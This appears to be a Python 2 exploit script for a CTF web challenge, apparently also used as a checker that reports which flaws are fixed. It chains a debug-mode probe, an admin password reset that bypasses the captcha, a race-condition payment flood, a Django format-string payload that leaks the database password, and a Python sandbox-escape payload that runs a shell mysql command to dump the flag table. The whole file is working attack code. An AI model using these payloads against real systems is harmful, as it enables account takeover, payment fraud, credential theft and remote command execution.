import re
import sys
import string
import random
import requests
from pyquery import PyQuery
from multiprocessing.dummy import Pool


class Bot:
    def __init__(self, ip, port, csrfname='csrfmiddlewaretoken'):
        self.url = 'http://%s:%s/' % (ip, port)
        self.csrfname = csrfname
        self.session = requests.session()
    
    def _generate_randstr(self, len=10):
        return ''.join(random.sample(string.ascii_letters, len))

    def _get_uuid(self, html):
        dom = PyQuery(html)
        return dom('form canvas').attr('rel')

    def _get_answer(self, html):
        uuid = self._get_uuid(html)
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x,y

    def _get_token(self, html):
        dom = PyQuery(html)
        form = dom("form")
        token = str(PyQuery(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token
    
    def _get_id_price(self, html):
        dom = PyQuery(html)
        form = dom("form")
        pay_id = str(PyQuery(form[0])("input[name=\"id\"]").attr("value")).strip()
        pay_price = str(PyQuery(form[0])("input[name=\"price\"]").attr("value")).strip()
        return pay_id, pay_price

    def reset(self, reset_user, reset_mail):
        res = self.session.get(self.url+'pass/reset/')
        html = res.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        password = self._generate_randstr(10)
        rs = self.session.post(self.url+'pass/reset/', data={
            self.csrfname: token,
            'username': reset_user,
            'mail': reset_mail,
            'password': password,
            'password_confirm': password,
            "captcha_x": x,
            "captcha_y": y
        })
        dom = PyQuery(rs.text)
        failed = dom('div.alert.alert-danger')
        failed = PyQuery(failed).text().strip()
        if len(failed):
            print '[-] Failed to Reset Admin'
            return None
        print '[*] Reset Admin Password: %s' % password
        return password
    
    def login(self, login_user, login_pswd):
        rs = self.session.get(self.url+'login/')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        rs = self.session.post(url=self.url+'login/', data={
            self.csrfname: token,
            "username": login_user,
            "password": login_pswd,
            "captcha_x": x,
            "captcha_y": y
        })
    
    def clear(self):
        rs = self.session.get(self.url+'user/reset/')

    def pay(self, cid, count, thread=20):
        rs = self.session.get(self.url+'info?id=%d' % cid)
        token = self._get_token(rs.text)
        pay_id, pay_price = self._get_id_price(rs.text)
        data = {
            self.csrfname: token,
            'id': pay_id,
            'price': 1
        }
        print '[*] Condition Racing, Thread:%d Count:%d...' % (thread, count)
        pool = Pool(thread)
        for _ in xrange(count):
            pool.apply_async(self.session.post, kwds={'url': self.url+'pay/', 'data': data})
        pool.close()
        pool.join()
    
    def on_debug(self):
        rs = self.session.get(self.url+'user/')
        if re.search('DEBUG', rs.content):
            return True
        else:
            return False
    
    def strf(self):
        payload = '{request.user.groups.model._meta.app_config.module.admin.settings.DATABASES}'
        rs = self.session.get(self.url+'info/?id='+payload)
        return rs.text
    
    def eval(self, pswd):
        rs = self.session.get(self.url+'user/')
        token = self._get_token(rs.text)
        payload = "\"\".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').popen('mysql -uadmin -p%s -e \"use sshop;select * from sshop_flag\"').read()" % pswd
        data = {
            self.csrfname: token,
            'cmd': payload
        }
        rs = self.session.post(self.url+'user/debug/', data=data)
        html = rs.text
        dom = PyQuery(html)
        pre = str(dom("pre"))
        return pre


def exp_reset(ip, port, csrfname):
    bot = Bot(ip, port, csrfname)
    admin_user = 'admin'
    admin_mail = 'root@grassfish.net'
    new_pswd = bot.reset(admin_user, admin_mail)
    bot.login(admin_user, new_pswd)
    return bot


def exp_debug(ip, port):
    err_url = 'http://%s:%s/%s/' % (ip, port, ''.join(random.sample(string.ascii_letters, 3)))
    res = requests.get(err_url)
    if re.search('DEBUG', res.content):
        print '[+] Stage 1 - Vulnerable: Debug Mode Opened'
        return True
    else:
        print '[-] Stage 1 - Secure: Debug Fixed'
        return False


def exp_race(bot):
    bot.clear()
    cid = random.randint(1, 100)
    bot.pay(cid, 12000, 20)
    if bot.on_debug():
        print '[+] Stage 2 - Vulnerable: Race Condition'
        return True
    else:
        print '[-] Stage 2 - Secure: RC Fixed'
        return False


def exp_strf(bot):
    res = bot.strf()
    if re.search('ENGINE', res):
        print '[+] Stage 3 - Vulnerable: Django String Format'
        pswd = re.search("'PASSWORD': '(.*?)',", res).group(1)
        print '[*] Got Database Password: ' + pswd
        return True
    else:
        print '[-] Stage 3 - Secure: SF Fixed'
        return False


def exp_eval(bot):
    db_conf = bot.strf()
    db_pswd = re.search("'PASSWORD': '(.*?)',", db_conf)
    if db_pswd:
        db_pswd = db_pswd.group(1)
        res = bot.eval(db_pswd)
        flag = re.search('ciscn{(.*?)}', res, re.I)
        if flag:
            print '[*] Got Flag: ' + flag.group(0)
            print '[+] Stage 4 - Vulnerable: Sandbox Escaped'
            return True
        else:
            print '[+] Stage 4 - Secure: Sandbox Fixed'
            return False
    else:
        print '[+] Stage 4 - Secure: Sandbox Fixed'
        return False


def exp(ip, port):
    try:
        stage1 = exp_debug(ip, port)
        admin = exp_reset(ip, port, 'csrfmiddlewaretoken')
        stage2 = exp_race(admin)
        stage3 = exp_strf(admin)
        stage4 = exp_eval(admin)
        print '[-] Done'
        if stage1 or stage2 or stage3 or stage4:
            print('[+] Not Fixed')
            return True
        else:
            print('[+] Fixed')
            return False
    except Exception as e:
        print '[!] Error, Unknown Exception,' + str(e)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Wrong Params")
        print("example: python %s %s %s" % (sys.argv[0], '127.0.0.1', '80'))
        exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    exp(ip, port)
